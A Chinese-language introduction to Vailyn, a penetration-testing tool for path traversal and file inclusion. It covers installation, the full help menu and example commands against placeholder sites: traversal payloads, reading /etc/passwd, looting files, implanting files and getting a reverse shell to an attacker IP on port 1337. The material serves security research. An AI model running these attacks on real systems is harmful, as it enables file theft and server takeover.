## 关于Vailyn

Vailyn是一款多阶段漏洞分析和利用工具，可以帮助广大研究人员分析、识别和利用路径遍历漏洞以及文件包含漏洞。该工具的性能非常强，并且害实现了大量的过滤规避技术。

Vailyn的操作分为两个阶段。首先，它可以尝试访问/etc/passwd或用户指定的文件来检测漏洞是否存在。此时，我们可以自由选择使用哪些Payload，而第二阶段该工具将会使用我们所选择的Payload。

第二阶段是漏洞利用阶段。现在，该工具将会尝试使用文件和目录字典从目标服务器提取所有可能的文件。搜索深度和目录排列级别可以通过参数进行调整。或者，它可以下载找到的文件，并将它们保存在其loot文件夹中。除此之外，Vailyn还会尝试在目标系统上获取一个反向Shell，并允许攻击者获得对目标服务器的完全控制。

当前版本的Vailyn支持多种攻击向量：通过查询实现注入、路径、Cookie和POST数据等。

## 工具安装

我们建议的Vailyn运行环境为Python 3.7+，但理论上来说该工具应当适用于Python 3.5或Python 3.6环境。

如需安装Vailyn，可以直接访问该项目的【R[
_eleases页面_](https://github.com/VainlyStrain/Vailyn/releases)】下载工具文档，或使用下列命令将该项目源码克隆至本地：

    
    
    $ git clone https://github.com/VainlyStrain/Vailyn

下载好项目源码之后，我们则需要安装好该工具所需的Python依赖组件。

### Unix系统

在Unix系统上，可以直接运行下列命令：

    
    
    $ pip install -r requirements.txt   # --user

### Windows系统

在Windows系统上，可以直接使用pip命令来安装“Vailyn\·›\requirements-windows.txt”中列出的依赖组件。

### 最后一步

如果你想要使用反向Shell模块的完整功能，我们还需要安装sshpass、ncat和konsole。

接下来，我们就可以直接运行下列命令来使用Vailyn了：

    
    
    $ python Vailyn -h

## 工具使用

Vailyn提供了三个必要参数：-v VIC, -a INT和-p2 TP P1 P2。如果使用了-a参数的话，则可以支持更多选项。

    
    
    ,                \                  /               ,
    
         ':.             \.      /\.     ./            .:'
    
            ':;.          :\ .,:/   ''. /;        ..::'
    
               ',':.,.__.'' '          ' `:.__:''.:'
    
                  ';..                        ,;'     *
    
           *         '.,                   .:'
    
                        `v;.            ;v'        o
    
                  .      '  '..      :.' '     .
    
                         '     ':;, '    '
    
                o                '          .   :        
    
                                               *
                             | Vailyn |
    
                          [ VainlyStrain ]    
    Vsynta Vailyn -v VIC -a INT -p2 TP P1 P2
    
            [-p PAM] [-i F] [-Pi VIC2]
    
          [-c C] [-n] [-d I J K]
    
           [-s T] [-t] [-L]
    
      [-l] [-P] [-A] 
    
    mandatory:
    
      -v VIC, --victim VIC  Target to attack, part 1 [pre-payload]
    
      -a INT, --attack INT  Attack type (int, 1-5, or A)
    
        A|  Spider (all)       2|  Path               5|  POST Data, json
    
        P|  Spider (partial)   3|  Cookie
    
        1|  Query Parameter    4|  POST Data, plain
    
      -p2 TP P1 P2, --phase2 TP P1 P2
    
                            Attack in Phase 2, and needed parameters
     
    ┌[ Values ]─────────────┬────────────────────┐
    
    │ TP      │ P1          │ P2                 │
    
    ├─────────┼─────────────┼────────────────────┤
    
    │ leak    │ File Dict   │ Directory Dict     │
    
    │ inject  │ IP Addr     │ Listening Port     │
    
    │ implant │ Source File │ Server Destination │
    
    └─────────┴─────────────┴────────────────────┘
    
     
    
    additional:
    
      -p PAM, --param PAM   query parameter or POST data for --attack 1, 4, 5
    
      -i F, --check F       File to check for in Phase 1 (df: etc/passwd)
    
      -Pi VIC2, --vic2 VIC2 Attack Target, part 2 [post-payload]
    
      -c C, --cookie C      Cookie to append (in header format)
    
      -l, --loot            Download found files into the loot folder
    
      -d I J K, --depths I J K
    
                            depths (I: phase 1, J: phase 2, K: permutation level)
    
      -h, --help            show this help menu and exit
    
      -s T, --timeout T     Request Timeout; stable switch for Arjun
    
      -t, --tor             Pipe attacks through the Tor anonymity network
    
      -L, --lfi             Additionally use PHP wrappers to leak files
    
      -n, --nosploit        skip Phase 2 (does not need -p2 TP P1 P2)
    
      -P, --precise         Use exact depth in Phase 1 (not a range)
    
      -A, --app             Start Vailyn's Qt5 interface
    
     
    
    develop:
    
      --debug               Display every path tried, even 404s.
    
      --version             Print program version and exit.
    
      --notmain             Avoid notify2 crash in subprocess call. 
    
    Info:
    
      to leak files using absolute paths: -d 0 0 0
    
      to get a shell using absolute paths: -d 0 X 0

Vailyn当前支持五种攻击向量，并且提供了自动化爬虫。我们可以通过-a INT参数来选择需要执行的攻击：

    
    
    INT        attack
    
    ----       -------    
    1          query-based attack  (https://site.com?file=../../../)
    
    2          path-based attack   (https://site.com/../../../)
    
    3          cookie-based attack (will grab the cookies for you)
    
    4          plain post data     (ELEM1=VAL1&ELEM2=../../../)
    
    5          json post data      ({"file": "../../../"})
    
    A          spider              fetch + analyze all URLs from site using all vectors
    
    P          partial spider      fetch + analyze all URLs from site using only selected vectors

## 工具使用演示

简单的查询攻击，第二阶段文件提取：

    
    
    $ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file --> http://site.com/download.php?file=../INJECT

简单的查询，但知道file.php已存在：

    
    
    $ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file -i file.php -d 2 X X -P

简单的路径攻击：

    
    
    $ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs --> http://site.com/../INJECT

路径攻击，但需要查询参数和标签：

    
    
    $ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs -Pi "?token=X#title" --> http://site.com/../INJECT?token=X#title

简单的Cookie攻击：

    
    
    $ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -p2 leak dicts/files dicts/dirs

POST Plain攻击：

    
    
    $ Vailyn -v "http://site.com/download.php" -a 4 -p2 leak dicts/files dicts/dirs -p "DATA1=xx&DATA2=INJECT"

POST JSON攻击：

    
    
    $ Vailyn -v "http://site.com/download.php" -a 5 -p2 leak dicts/files dicts/dirs -p '{"file": "INJECT"}'

攻击，但目标存在登录界面：

    
    
    $ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"

攻击，但需要一个反向Shell（端口1337）：

    
    
    $ Vailyn -v "http://site.com/download.php" -a 1 -p2 inject MY.IP.IS.XX 1337 # a high Phase 2 Depth is needed for log injection

完全的爬虫自动化模式：

    
    
    $ Vailyn -v "http://root-url.site" -a A

## 工具演示视频

 **视频地址：** 【[ _点我观看_](https://asciinema.org/a/384813)】

## 项目地址

 **Vailyn：** 【[ _GitHub传送门_](https://github.com/VainlyStrain/Vailyn)】

## 参考资料

> [
> _https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted_](https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted)

